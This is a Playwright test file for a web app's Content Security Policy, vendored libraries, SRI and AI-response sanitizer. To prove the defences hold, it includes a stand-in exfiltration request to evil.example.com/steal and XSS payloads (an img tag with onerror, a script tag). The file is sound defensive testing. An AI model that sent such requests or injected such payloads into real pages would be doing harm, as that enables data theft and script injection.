// v14.16.30 (#27): CSP meta + vendored libraries + SRI. Приложение работает без нарушений CSP,
// разрешённые провайдеры доступны, посторонние хосты блокируются браузером.
const { test, expect } = require('@playwright/test');

async function boot(page) {
  await page.addInitScript(() => {
    localStorage.setItem('eiti_onboarded', 'true'); localStorage.setItem('eiti_toured_v7', '1'); localStorage.setItem('eiti_install_hint_seen', '1');
    localStorage.setItem('eiti_ai_provider', 'deepseek'); localStorage.removeItem('deepseek_api_key'); localStorage.setItem('eiti_offline_mode', '0');
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__cspViolations.push(e.violatedDirective + ' ' + e.blockedURI));
  });
  await page.goto('/index.html');
  await page.waitForFunction(() => window.eitiChatReady === true && typeof eitiDb !== 'undefined' && !!eitiDb, null, { timeout: 30000 });
}

test.describe('v14.16.30 CSP / SRI (#27)', () => {
  test.use({ serviceWorkers: 'block' });
  test.setTimeout(90000);

  test('boot without CSP violations; vendored libs loaded; allowlist enforced', async ({ page }) => {
    const external = [];
    page.on('request', (r) => { if (/cdnjs\.cloudflare\.com\/ajax\/libs\/(dompurify|mammoth)/.test(r.url())) external.push(r.url()); });
    await page.route('https://api.deepseek.com/**', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: '{"ok":true}' }));
    await boot(page);
    const libs = await page.evaluate(() => ({
      purify: !!(window.DOMPurify && DOMPurify.sanitize) && DOMPurify.version,
      mammoth: !!(window.mammoth && mammoth.extractRawText),
      csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'),
    }));
    expect(libs).toEqual({ purify: '3.4.18', mammoth: true, csp: true });
    expect(external).toEqual([]);
    const net = await page.evaluate(async () => {
      const ok = await fetch('https://api.deepseek.com/v1/models').then((r) => r.ok, (e) => 'ERR ' + e.message);
      const blocked = await fetch('https://evil.example.com/steal?k=1').then(() => 'LEAKED', () => 'blocked');
      return { ok, blocked };
    });
    expect(net).toEqual({ ok: true, blocked: 'blocked' });
    // санитайзер на месте: рендер ответа ИИ не выполняет скрипты
    const html = await page.evaluate(() => eitiRichRender('**жирный** <img src=x onerror="window.__pwned=1"> <script>window.__pwned=1</script>').html);
    expect(html).toContain('<strong>');
    expect(html).not.toMatch(/<img|<script/i);
    expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
    const v = await page.evaluate(() => window.__cspViolations.filter((x) => !/evil\.example\.com/.test(x)));
    expect(v).toEqual([]);
    expect(await page.evaluate(() => window.__cspViolations.some((x) => /^connect-src .*evil\.example\.com/.test(x)))).toBe(true);
  });

  test('mermaid loads from the pinned CDN URL with SRI', async ({ page }) => {
    await boot(page);
    const r = await page.evaluate(() => eitiMermaidEnsure().then((m) => !!(m && m.render), (e) => 'ERR ' + e.message));
    test.skip(typeof r === 'string' && /load failed|offline|timeout/.test(r), 'CDN unreachable: ' + r);
    expect(r).toBe(true);
    expect(await page.evaluate(() => window.__cspViolations)).toEqual([]);
  });
});
